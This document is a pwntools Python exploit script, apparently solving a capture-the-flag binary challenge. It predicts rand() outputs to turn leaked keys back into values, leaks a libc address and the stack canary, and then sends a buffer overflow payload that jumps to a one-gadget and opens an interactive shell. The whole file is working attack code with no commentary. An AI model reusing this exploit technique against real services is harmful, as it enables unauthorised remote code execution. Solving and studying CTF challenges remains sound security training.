#!/usr/bin/env python3
from pwn import *
import ctypes

BIN_FILE  = './chall'
LIBC_FILE = './libc.so.6'

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context(os='linux', arch='amd64')
# context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

binf = ELF(BIN_FILE)
libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None

chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
keys = {} 

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BIN_FILE)
    else:
        return process(BIN_FILE)

def prepare():
    loaded_lib = ctypes.cdll.LoadLibrary('./libc.so.6')
    for i in range(0x10000):
        loaded_lib.srand(i)
        key = ''
        for j in range(0x20):
            key += chars[loaded_lib.rand() % 0x3e]
        if i == 1:
            continue
        keys[key] = i

def leak(io, offset):
    io.sendlineafter('>', 'id ' + str(offset))
    io.sendlineafter('>', 'create')
    io.recvuntil('key: ')
    key = io.recv(32).decode()
    return keys[key]

def attack(io, **kwargs):
    base_off = 73
    canary_off = 49
    onegads = [0x4f3d5, 0x4f432, 0x10a41c]

    leaked_addr = 0 # __libc_start_main + 231
    for i in range(4):
        leaked_addr += leak(io, base_off + i) << (16 * i)
    libc.address = leaked_addr  - 231 - libc.sym.__libc_start_main
    info('libc_base : 0x{:08x}'.format(libc.address))

    canary = 0
    for i in range(4):
        canary += leak(io, canary_off + i) << (16 * i)
    info('canary : 0x{:08x}'.format(canary))

    addr_onegad = libc.address + onegads[0]
    payload = b'a' * 88
    payload += p64(canary)
    payload += p64(0xdeadbeef)
    payload += p64(addr_onegad)
    io.sendlineafter('>', payload)
    io.sendlineafter('>', 'quit')
    
def main():
    io = start()
    prepare()
    attack(io)
    io.interactive()

if __name__ == '__main__':
    main()
